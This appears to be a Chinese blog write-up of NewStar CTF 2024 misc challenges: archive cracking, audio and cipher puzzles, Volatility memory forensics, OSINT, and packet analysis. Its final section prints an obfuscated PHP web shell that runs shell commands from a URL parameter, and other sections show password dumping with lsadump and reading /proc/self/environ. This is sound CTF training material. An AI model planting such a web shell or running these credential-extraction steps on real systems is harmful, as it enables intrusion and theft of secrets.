---
title: NewStar CTF 2024 misc WP - 渗透测试中心
url: https://www.cnblogs.com/backlion/p/18527614
source: 博客园 - 渗透测试中心
date: 2024-11-06
fetch_date: 2025-10-06T19:18:42.590892
---

# NewStar CTF 2024 misc WP - 渗透测试中心

[![](https://img2024.cnblogs.com/blog/35695/202509/35695-20250929100304557-587378723.jpg)](https://qoder.com/)

* [![博客园logo](//assets.cnblogs.com/logo.svg)](https://www.cnblogs.com/ "开发者的网上家园")
* [会员](https://cnblogs.vip/)
* [众包](https://www.cnblogs.com/cmt/p/18500368)
* [新闻](https://news.cnblogs.com/)
* [博问](https://q.cnblogs.com/)
* [闪存](https://ing.cnblogs.com/)
* [赞助商](https://www.cnblogs.com/cmt/p/19081960)
* [HarmonyOS](https://harmonyos.cnblogs.com/)
* [Chat2DB](https://chat2db-ai.com/)

* ![搜索](//assets.cnblogs.com/icons/search.svg)
  ![搜索](//assets.cnblogs.com/icons/enter.svg)
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    所有博客
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    当前博客
* [![写随笔](//assets.cnblogs.com/icons/newpost.svg)](https://i.cnblogs.com/EditPosts.aspx?opt=1 "写随笔")
  [![我的博客](//assets.cnblogs.com/icons/myblog.svg)](https://passport.cnblogs.com/GetBlogApplyStatus.aspx "我的博客")
  [![短消息](//assets.cnblogs.com/icons/message.svg)](https://msg.cnblogs.com/ "短消息")
  ![简洁模式](//assets.cnblogs.com/icons/lite-mode-on.svg)

  [![用户头像](//assets.cnblogs.com/icons/avatar-default.svg)](https://home.cnblogs.com/)

  [我的博客](https://passport.cnblogs.com/GetBlogApplyStatus.aspx)
  [我的园子](https://home.cnblogs.com/)
  [账号设置](https://account.cnblogs.com/settings/account)
  [会员中心](https://vip.cnblogs.com/my)
  简洁模式 ...
  退出登录

  [注册](https://account.cnblogs.com/signup)
  登录

[![返回主页](/skins/custom/images/logo.gif)](https://www.cnblogs.com/backlion/)

# [渗透测试中心](https://www.cnblogs.com/backlion)

##

* [博客园](https://www.cnblogs.com/)
* [首页](https://www.cnblogs.com/backlion/)
* [新随笔](https://i.cnblogs.com/EditPosts.aspx?opt=1)
* [联系](https://msg.cnblogs.com/send/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83)
* [管理](https://i.cnblogs.com/)
* 订阅
  [![订阅](/skins/coffee/images/xml.gif)](https://www.cnblogs.com/backlion/rss/)

# [NewStar CTF 2024 misc WP](https://www.cnblogs.com/backlion/p/18527614 "发布于 2024-11-05 13:19")

## decompress

压缩包套娃，一直解到最后一层，将文件提取出来

![image-20241024133500142](https://img2023.cnblogs.com/blog/1049983/202411/1049983-20241105131902840-1882049152.png)

提示给出了一个正则，按照正则爆破密码，一共五位，第四位是数字

```
 ^([a-z]){3}\d[a-z]$
```

一共就五位数，直接ARCHPR爆破，得到密码 xtr4m，解压得到flag

![image-20241024143051751](https://img2023.cnblogs.com/blog/1049983/202411/1049983-20241105131903782-1459928939.png)

![image-20241024133955066](https://img2023.cnblogs.com/blog/1049983/202411/1049983-20241105131904445-741757373.png)

## pleasingMusic

题目描述中提到：

> 一首歌可以好听到**正反都好听**

根据提示（其实也能听出来后半段音乐是倒放出来的）将音频进行反向处理实现**倒放**，再解析其中的摩斯电码（Morse Code）。

![界面 1](https://img2023.cnblogs.com/blog/1049983/202411/1049983-20241105131905079-134191859.png)![界面 2](https://img2023.cnblogs.com/blog/1049983/202411/1049983-20241105131905882-570814868.png)

可以手动翻译摩斯电码表，也可以使用[在线解码](https://www.lddgo.net/encrypt/morse)。

粗的表示：-，细的表示：.间隔或者空格：用空格或者/分割

![Morse 解密结果](https://img2023.cnblogs.com/blog/1049983/202411/1049983-20241105131906548-742922908.png)

![image-20241024134921354](https://img2023.cnblogs.com/blog/1049983/202411/1049983-20241105131907137-121380167.png)

## WhereIsFlag

纯命令手工查找，找到真正的 flag 在 `/proc/self/environ` 文件（可用于获取当前进程的环境变量）内，只要执行下面的命令就能拿到 flag.

```
 cat /proc/self/environ
```

![image-20241024135548272](https://img2023.cnblogs.com/blog/1049983/202411/1049983-20241105131907704-225904415.png)

## Labyirinth

![image-20241024135921781](https://img2023.cnblogs.com/blog/1049983/202411/1049983-20241105131908217-725514925.png)

![image-20241024135957928](https://img2023.cnblogs.com/blog/1049983/202411/1049983-20241105131908757-1884558633.png)

## 兑换码

![image-20241024140300688](https://img2023.cnblogs.com/blog/1049983/202411/1049983-20241105131909619-1942004535.png)

## wireshark\_checkin

![image-20241024140542352](https://img2023.cnblogs.com/blog/1049983/202411/1049983-20241105131910352-1221180782.png)

![image-20241024140718246](https://img2023.cnblogs.com/blog/1049983/202411/1049983-20241105131910886-1182706562.png)

## wireshark\_secret

![image-20241024141014162](https://img2023.cnblogs.com/blog/1049983/202411/1049983-20241105131911514-374071659.png)

![image-20241024141234550](https://img2023.cnblogs.com/blog/1049983/202411/1049983-20241105131912229-180569208.png)

联系题目描述，找到[提瓦特文字对照表](https://www.miyoushe.com/ys/article/30743427)

![image-20241024141652291](https://img2023.cnblogs.com/blog/1049983/202411/1049983-20241105131912919-1468257868.png)

对照表解出了很多东西

我一开始一直试的中间的那串大的，但是大小写都不对

后面继续解密四周小的密文，得到：FLAGISASENTENCE IIAAELGTSFKFA

DOYOUKNOWFENCE MESIOAABGNHNSGOGMYEIADE

提示 flag 是一句话，还有 FENCE 也就是栅栏加密MESIOAABGNHNSGOGMYEIADE

<https://ctf.bugku.com/tool/railfence>

![image-20241024142911077](https://img2023.cnblogs.com/blog/1049983/202411/1049983-20241105131913586-1862086099.png)

包裹 flag 提交发现没对，换小写发现正确

最终 flag为：flag{maybegenshinisagoodgame}

## 字里行间的秘密

使用vscode打开，发现U+202c的的宽零字节

![image-20241024143304292](https://img2023.cnblogs.com/blog/1049983/202411/1049983-20241105131914176-1934594890.png)

![image-20241024143434003](https://img2023.cnblogs.com/blog/1049983/202411/1049983-20241105131914743-474526757.png)

得到密码：it\_is\_k3y

使用密码打开word，发现空白，ctr+A全选，复制出来，得到flag

![image-20241024143550459](https://img2023.cnblogs.com/blog/1049983/202411/1049983-20241105131915329-2061878992.png)

## 热心助人的小明同学

vol.py -f image.raw imageinfo

![image-20241024143952884](https://img2023.cnblogs.com/blog/1049983/202411/1049983-20241105131915932-1606422773.png)

可知建议选择的操作系统版本有：Win7SP1x86\_23418, Win7SP0x86, Win7SP1x86\_24000, Win7SP1x86. 这里选择第一个（Win7SP1x86\_23418）进行尝试，反正不行就试试别的。

voL.py -f image.raw --profile=Win/SP1x86\_23418 lsadump

![image-20241024144028191](https://img2023.cnblogs.com/blog/1049983/202411/1049983-20241105131916816-1818712134.png)

开头的 `0x48` 并不是密码，你可以理解为是一个标志，除开这个你就能得到系统密码：`ZDFyVDlfdTNlUl9wNHNTdzByRF9IQUNLRVIh`.

最终flag 为 `flag{ZDFyVDlfdTNlUl9wNHNTdzByRF9IQUNLRVIh}`

## 用溯流仪见证伏特台风

第一步，打开新闻视频的链接

![bilibili1](https://img2023.cnblogs.com/blog/1049983/202411/1049983-20241105131917570-2000538852.png)

![bilibili2](https://img2023.cnblogs.com/blog/1049983/202411/1049983-20241105131918216-1526302729.png)

根据视频，我们获得以下信息：

* 所需报告：The Rise of Dark Power...
* 对应版本：最初 4 月 15 日版本
* 现状：所需信息已经被篡改

我们直接搜索报告名称

<https://threatmon.io/storage/the-rise-of-dark-power-a-close-look-at-the-group-and-their-ransomware.pdf>

![google](https://img2023.cnblogs.com/blog/1049983/202411/1049983-20241105131918769-608538769.png)

![duckduckgo](https://img2023.cnblogs.com/blog/1049983/202411/1049983-20241105131919430-1535647695.png)

可以看到我们需要的 PDF 文件，但是视频中又提到报告内容已经被篡改

![篡改](https://img2023.cnblogs.com/blog/1049983/202411/1049983-20241105131920134-237940247.png)

所以现版本肯定是没有我们所需的信息的

出题人之前运气好，搜到过可以直接下载的原始版本 PDF，直接就可以开做。

但运气不好怎么办呢？我们请出我们的网站时光机—— wayback machine.

![wayback 1](https://img2023.cnblogs.com/blog/1049983/202411/1049983-20241105131920848-1868844517.png)

输入官网链接，启动溯流仪，正好有 4 月 15 日的版本。

![wayback 2](https://img2023.cnblogs.com/blog/1049983/202411/1049983-20241105131921434-1640476692.png)

![wayback 3](https://img2023.cnblogs.com/blog/1049983/202411/1049983-20241105131922119-1200684156.png)

下载文件，剩下的内容就和视频中演示的一样了。

移开封底图片，拿到 Domain 框里的东西，然后 MD5，

当然，你要是能用肉眼直接把视频里的模糊信息读出来，出题人也认了。

![domain](https://img2023.cnblogs.com/blog/1049983/202411/1049983-20241105131922675-67747750.png)

![md5](https://img2023.cnblogs.com/blog/1049983/202411/1049983-20241105131923151-1057397191.png)

包上 flag，得到 `flag{6c3ea51b6f9d4f5e}`.

## Herta's Study

http导出得到upload.php

![image-20241024145523278](https://img2023.cnblogs.com/blog/1049983/202411/1049983-20241105131923820-1724089505.png)

```
 <?php
     $payload=$_GET['payload'];
     $payload=shell_exec($payload);
     $bbb=create_function(
         base64_decode('J'.str_rot13('T').'5z'),
         base64_decode('JG5zPWJhc2U2NF9lbmNvZGUoJG5zKTsNCmZvcigkaT0wOyRpPHN0cmxlbigkbnMpOyRp
         Kz0xKXsNCiAgICBpZigkaSUy'.str_rot13('CG0kXKfAPvNtVPNtVPNtWT5mJlEcKG1m').'dHJfcm90MTMoJG5zWyRpXSk7DQo
         gICAgfQ0KfQ0KcmV0dXJuICRuczs==')
     );
     echo $bbb($payload);
 ?>
...